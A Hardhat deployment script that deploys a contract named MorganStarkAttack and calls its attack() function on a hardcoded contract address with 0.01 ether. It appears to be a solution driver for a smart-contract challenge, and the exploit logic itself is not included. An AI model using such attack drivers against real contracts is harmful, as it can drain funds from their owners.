// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const MorganStarkAttackFactory = await hre.ethers.getContractFactory("MorganStarkAttack");
  const MorganStarkAttack = await MorganStarkAttackFactory.deploy();
  await MorganStarkAttack.deployed();

  console.log("MorganStarkAttack deployed to:", MorganStarkAttack.address);

  // const [signer] = await hre.ethers.getSigners();
  // const MorganStarkAttack = await ethers.getContractAt(
  //   require('../artifacts/contracts/MorganStark.sol/MorganStarkAttack.json').abi,
  //   '0xbA034D070Aa9209cd2883aC81e0178B4199006a2',
  //   signer
  // )
  const txRes = await MorganStarkAttack.attack('0xb9cefd6c3a5ecbc27eba0fe5f1a7c8fecfcbbbea', {
    value: ethers.utils.parseEther('0.01'),
    gasLimit: 50000
  });
  const rc = await txRes.wait();
  console.log('attack tx hash: ', rc.transactionHash);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
